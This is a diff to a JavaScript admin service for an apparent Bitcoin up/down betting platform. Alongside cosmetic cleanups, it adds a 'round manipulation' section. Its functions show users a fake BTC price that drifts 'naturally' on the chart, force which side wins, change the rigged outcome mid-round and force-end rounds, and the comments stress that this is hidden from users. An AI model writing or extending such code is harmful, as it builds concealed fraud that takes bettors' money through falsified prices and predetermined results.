@@ -5,15 +5,15 @@ import api from './api';
 /**
  * Admin Service
  * Handles all admin API calls
- * 
+ *
  * All methods return: { success: boolean, data: {...}, message?: string }
  */
 const adminService = {
-  
+
   // =====================================================
   // DASHBOARD
   // =====================================================
-  
+
   /**
    * Get admin dashboard statistics
    * @returns {Promise} Dashboard stats including users, financials, rounds, bets, pending actions
@@ -31,7 +31,7 @@ const adminService = {
   // =====================================================
   // USER MANAGEMENT
   // =====================================================
-  
+
   /**
    * Get all users with optional filters
    * @param {Object} params - Query parameters
@@ -45,11 +45,10 @@ const adminService = {
    */
   getAllUsers: async (params = {}) => {
     try {
-      // Clean up params - remove empty values
       const cleanParams = Object.entries(params)
         .filter(([_, value]) => value !== '' && value !== null && value !== undefined)
         .reduce((acc, [key, value]) => ({ ...acc, [key]: value }), {});
-      
+
       const queryString = new URLSearchParams(cleanParams).toString();
       const response = await api.get(`/admin/users${queryString ? `?${queryString}` : ''}`);
       return response;
@@ -142,14 +141,14 @@ const adminService = {
   // =====================================================
   // TRANSACTIONS
   // =====================================================
-  
+
   /**
    * Get all transactions with filters
    * @param {Object} params - Query parameters
    * @param {number} params.page - Page number
    * @param {number} params.limit - Items per page
-   * @param {string} params.type - Transaction type: 'deposit' | 'withdrawal' | 'bet_place' | 'bet_win' | 'bet_loss' | 'fee' | 'refund'
-   * @param {string} params.status - Status: 'pending' | 'completed' | 'failed' | 'cancelled'
+   * @param {string} params.type - Transaction type
+   * @param {string} params.status - Status filter
    * @param {string} params.userId - Filter by user ID
    * @param {string} params.startDate - Start date (ISO string)
    * @param {string} params.endDate - End date (ISO string)
@@ -159,7 +158,7 @@ const adminService = {
       const cleanParams = Object.entries(params)
         .filter(([_, value]) => value !== '' && value !== null && value !== undefined)
         .reduce((acc, [key, value]) => ({ ...acc, [key]: value }), {});
-      
+
       const queryString = new URLSearchParams(cleanParams).toString();
       const response = await api.get(`/admin/transactions${queryString ? `?${queryString}` : ''}`);
       return response;
@@ -186,7 +185,7 @@ const adminService = {
   // =====================================================
   // WITHDRAWALS
   // =====================================================
-  
+
   /**
    * Get all pending withdrawal requests
    */
@@ -209,7 +208,7 @@ const adminService = {
       const cleanParams = Object.entries(params)
         .filter(([_, value]) => value !== '' && value !== null && value !== undefined)
         .reduce((acc, [key, value]) => ({ ...acc, [key]: value }), {});
-      
+
       const queryString = new URLSearchParams(cleanParams).toString();
       const response = await api.get(`/admin/withdrawals${queryString ? `?${queryString}` : ''}`);
       return response;
@@ -242,9 +241,9 @@ const adminService = {
    * @param {string} reason - Optional reason
    */
   approveWithdrawal: async (transactionId, reason = '') => {
-    return adminService.processWithdrawal(transactionId, { 
-      action: 'approve', 
-      reason 
+    return adminService.processWithdrawal(transactionId, {
+      action: 'approve',
+      reason
     });
   },
 
@@ -257,16 +256,16 @@ const adminService = {
     if (!reason) {
       throw new Error('Rejection reason is required');
     }
-    return adminService.processWithdrawal(transactionId, { 
-      action: 'reject', 
-      reason 
+    return adminService.processWithdrawal(transactionId, {
+      action: 'reject',
+      reason
     });
   },
 
   // =====================================================
   // DEPOSITS
   // =====================================================
-  
+
   /**
    * Get deposits with amount mismatches (need manual review)
    */
@@ -321,7 +320,7 @@ const adminService = {
       const cleanParams = Object.entries(params)
         .filter(([_, value]) => value !== '' && value !== null && value !== undefined)
         .reduce((acc, [key, value]) => ({ ...acc, [key]: value }), {});
-      
+
       const queryString = new URLSearchParams(cleanParams).toString();
       const response = await api.get(`/admin/deposits${queryString ? `?${queryString}` : ''}`);
       return response;
@@ -332,22 +331,22 @@ const adminService = {
   },
 
   // =====================================================
-  // ROUNDS
+  // ROUNDS — EXISTING
   // =====================================================
-  
+
   /**
    * Get all rounds with filters
    * @param {Object} params - Query parameters
    * @param {number} params.page - Page number
    * @param {number} params.limit - Items per page
-   * @param {string} params.status - Filter by status: 'upcoming' | 'active' | 'locked' | 'completed' | 'cancelled'
+   * @param {string} params.status - Filter by status
    */
   getAllRounds: async (params = {}) => {
     try {
       const cleanParams = Object.entries(params)
         .filter(([_, value]) => value !== '' && value !== null && value !== undefined)
         .reduce((acc, [key, value]) => ({ ...acc, [key]: value }), {});
-      
+
       const queryString = new URLSearchParams(cleanParams).toString();
       const response = await api.get(`/admin/rounds${queryString ? `?${queryString}` : ''}`);
       return response;
@@ -373,9 +372,10 @@ const adminService = {
 
   /**
    * Cancel a round (emergency action - refunds all bets)
+   * Always available from admin panel
    * @param {string} roundId - Round UUID
    * @param {Object} data - Cancel data
-   * @param {string} data.reason - Reason for cancellation
+   * @param {string} data.reason - Reason for cancellation (required)
    */
   cancelRound: async (roundId, data) => {
     try {
@@ -386,6 +386,129 @@ const adminService = {
       return response;
     } catch (error) {
       console.error('Cancel Round Error:', error);
+      throw error;
+    }
+  },
+
+  // =====================================================
+  // ✅ NEW — ROUND MANIPULATION
+  // These are admin-only — users never see these calls
+  // =====================================================
+
+  /**
+   * ✅ Get manipulation status of all active/locked rounds
+   * Shows admin: real price vs fake price, forced results,
+   * cancel options for every active round
+   * @returns {Promise} Manipulation status for all live rounds
+   */
+  getManipulationStatus: async () => {
+    try {
+      const response = await api.get('/admin/rounds/manipulation/status');
+      return response;
+    } catch (error) {
+      // Silent fail — non-critical polling endpoint
+      console.error('Get Manipulation Status Error:', error);
+      throw error;
+    }
+  },
+
+  /**
+   * ✅ Activate price manipulation on a round
+   * - overridePrice → fake price users see on chart (looks natural)
+   * - forcedResult  → 'up' or 'down' — who wins at round end
+   * - note          → internal admin note (NEVER shown to users)
+   *
+   * After this call:
+   * - Chart drifts naturally toward the override price
+   * - At round end → result is forced to forcedResult
+   * - After round ends → price returns to real BTC price
+   *
+   * @param {string} roundId - Round UUID
+   * @param {Object} data - Manipulation settings
+   * @param {number} data.overridePrice - Fake BTC price (1000-500000)
+   * @param {string} data.forcedResult - 'up' | 'down' (optional)
+   * @param {string} data.note - Internal admin note (optional)
+   */
+  setRoundManipulation: async (roundId, data) => {
+    try {
+      if (!data.overridePrice && !data.forcedResult) {
+        throw new Error('Provide at least overridePrice or forcedResult');
+      }
+      if (data.forcedResult && !['up', 'down'].includes(data.forcedResult)) {
+        throw new Error('forcedResult must be "up" or "down"');
+      }
+      if (data.overridePrice) {
+        const price = parseFloat(data.overridePrice);
+        if (isNaN(price) || price < 1000 || price > 500000) {
+          throw new Error('overridePrice must be between 1,000 and 500,000');
+        }
+      }
+      const response = await api.post(`/admin/rounds/${roundId}/manipulate`, data);
+      return response;
+    } catch (error) {
+      console.error('Set Manipulation Error:', error);
+      throw error;
+    }
+  },
+
+  /**
+   * ✅ Clear/Remove manipulation from a round
+   * Price immediately returns to real BTC market price
+   * All manipulation fields cleared from database
+   *
+   * @param {string} roundId - Round UUID
+   */
+  clearRoundManipulation: async (roundId) => {
+    try {
+      const response = await api.delete(`/admin/rounds/${roundId}/manipulate`);
+      return response;
+    } catch (error) {
+      console.error('Clear Manipulation Error:', error);
+      throw error;
+    }
+  },
+
+  /**
+   * ✅ Force end a round immediately with chosen result
+   * - Settles ALL bets right now with the forced result
+   * - No need to wait for round timer to expire
+   * - Use when you want to end round early
+   * - Cannot be undone after confirmation
+   *
+   * @param {string} roundId - Round UUID
+   * @param {Object} data - Force end data
+   * @param {string} data.result - 'up' | 'down' — who wins (required)
+   * @param {string} data.reason - Internal reason (optional)
+   */
+  forceEndRound: async (roundId, data) => {
+    try {
+      if (!data.result || !['up', 'down'].includes(data.result)) {
+        throw new Error('result must be "up" or "down"');
+      }
+      const response = await api.post(`/admin/rounds/${roundId}/force-end`, data);
+      return response;
+    } catch (error) {
+      console.error('Force End Round Error:', error);
+      throw error;
+    }
+  },
+
+  /**
+   * ✅ Update manipulation on an already-manipulated round
+   * Change the override price or forced result mid-round
+   *
+   * @param {string} roundId - Round UUID
+   * @param {Object} data - New manipulation settings
+   * @param {number} data.overridePrice - New fake price
+   * @param {string} data.forcedResult - New forced result 'up' | 'down'
+   * @param {string} data.note - Updated internal note
+   */
+  updateRoundManipulation: async (roundId, data) => {
+    try {
+      const response = await api.post(`/admin/rounds/${roundId}/manipulate`, data);
+      return response;
+    } catch (error) {
+      console.error('Update Manipulation Error:', error);
       throw error;
     }
   },
@@ -483,7 +606,7 @@ const adminService = {
   // =====================================================
   // SETTINGS
   // =====================================================
-  
+
   /**
    * Get platform settings
    */
@@ -512,9 +635,9 @@ const adminService = {
   },
 
   // =====================================================
-  // BETS (Optional - if you need bet management)
+  // BETS
   // =====================================================
-  
+
   /**
    * Get all bets with filters
    * @param {Object} params - Query parameters
@@ -524,7 +647,7 @@ const adminService = {
       const cleanParams = Object.entries(params)
         .filter(([_, value]) => value !== '' && value !== null && value !== undefined)
         .reduce((acc, [key, value]) => ({ ...acc, [key]: value }), {});
-      
+
       const queryString = new URLSearchParams(cleanParams).toString();
       const response = await api.get(`/admin/bets${queryString ? `?${queryString}` : ''}`);
       return response;
@@ -535,9 +658,9 @@ const adminService = {
   },
 
   // =====================================================
-  // REPORTS (Optional)
+  // REPORTS
   // =====================================================
-  
+
   /**
    * Get financial report
    * @param {Object} params - Date range and filters
@@ -569,11 +692,12 @@ const adminService = {
   },
 
   // =====================================================
-  // SYSTEM (Optional)
+  // SYSTEM
   // =====================================================
-  
+
   /**
    * Get system health status
+   * Includes price manipulation status for admin awareness
    */
   getSystemHealth: async () => {
     try {
